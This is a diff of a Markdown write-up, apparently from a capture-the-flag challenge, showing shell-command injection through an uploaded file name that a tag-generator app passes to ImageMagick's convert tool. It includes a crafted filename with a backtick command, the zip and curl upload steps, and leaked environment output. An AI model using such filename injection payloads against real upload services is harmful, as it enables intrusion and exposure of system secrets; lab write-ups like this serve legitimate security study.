@@ -34,7 +34,7 @@ This code allows to place uploaded files in a chosen place on the remote system 
 Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
 ```
 jsw@io:*$ touch "\'\`env\>joergen\`\;\'.jpg"
-jsw@io:*$ zip joergen.zip *.jpg
+jsw@io:*$ zip joergen.zip "\'\`env\>joergen\`\;\'.jpg"
   adding: '`env>joergen`;'.jpg (stored 0%)
 jsw@io:*$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]
@@ -45,7 +45,7 @@ GREETZ=JackFrostWasHere
 [..]
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjM4NDYwMjcyLDE5MzMzNjE3ODcsLTE0Nj
-c2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLDkyMDQ1NTg2
-NSwtMTYwNjA3ODA0MF19
+eyJoaXN0b3J5IjpbMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMz
+M2MTc4NywtMTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0
+NTMsOTIwNDU1ODY1LC0xNjA2MDc4MDQwXX0=
 -->
